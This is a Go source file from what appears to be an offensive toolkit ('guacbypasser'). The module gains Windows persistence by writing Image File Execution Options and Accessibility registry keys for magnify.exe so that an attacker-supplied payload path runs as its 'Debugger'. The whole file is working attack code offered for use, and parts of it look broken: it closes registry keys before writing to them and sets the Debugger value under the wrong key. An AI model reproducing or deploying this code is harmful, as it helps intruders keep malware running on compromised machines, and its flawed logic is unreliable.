package guacbypasser

import (
	"path/filepath"
	"runtime"

	sc ".."
	"golang.org/x/sys/windows/registry"
)

func w32_nt_persistence_ifeo(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "ifeo",
		Desc: "Gain persistence using IFEO debugger registry key",
		Id:   6,

		Type:   "Persistence",
		Module: "w32_nt_persistence_ifeo",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}

	if _, _, err = registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err, inf
	}
	if runtime.GOARCH == "386" {
		if _, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

			return err, inf
		}

		wk32, err := registry.OpenKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		defer wk32.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			return err, inf
		}

		wk32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		wk32.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32.SetStringValue("Debugger", fPath); err != nil {
			return err, inf
		}
	} else {
		if _, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

			return err, inf
		}
		wk32, err := registry.OpenKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		defer wk32.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			return err, inf
		}

		wk32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		wk32.Close()
		if err != nil {
			return err, inf
		}
		if err := wk32.SetStringValue("Debugger", fPath); err != nil {
			return err, inf
		}
	}

	return nil, inf
}

// NewPersistenceIFEO #add-some-info-please
func NewPersistenceIFEO(p string) (error, sc.Informer) { return w32_nt_persistence_ifeo(p) }
